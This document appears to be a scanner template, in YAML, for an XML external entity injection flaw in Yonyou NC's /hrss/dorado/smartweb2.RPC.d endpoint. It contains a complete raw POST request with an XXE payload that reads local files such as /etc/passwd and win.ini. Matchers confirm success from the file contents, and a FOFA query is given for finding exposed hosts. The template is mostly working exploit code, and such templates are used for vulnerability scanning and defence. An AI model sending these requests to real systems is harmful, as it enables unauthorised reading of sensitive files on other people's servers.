id: poc-yaml-yongyou-nc-smartweb2-rpc-d-xml-external-entity-injection
info:
  name: 用友NC smartweb2.RPC.d XML外部实体注入漏洞
  author: ProjectDiscoveryAI
  severity: critical
  tags: xxe
  metadata:
    finger: 用友NC
    fofa: app="用友-UFIDA-NC" && is_domain=false

variables:
  path:
    - "file:///C://windows//win.ini"
    - "file:///etc/passwd"

http:
  - raw:
      - |
        POST /hrss/dorado/smartweb2.RPC.d?__rpc=true HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        __viewInstanceId=nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel&__xml=<!DOCTYPE z [<!ENTITY Password SYSTEM "{{path}}" >]><rpc transaction="10" method="resetPwd"><vps><p name="__profileKeys">%26Password;</p ></vps></rpc>
    payloads:
      path:
        - "file:///C://windows//win.ini"
        - "file:///etc/passwd"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "xml"
      - type: dsl
        dsl:
          - "contains(body, '[fonts]') && contains(body, '[files]')"
          - "contains(body, 'root:') && contains(body, '/bin/bash')"
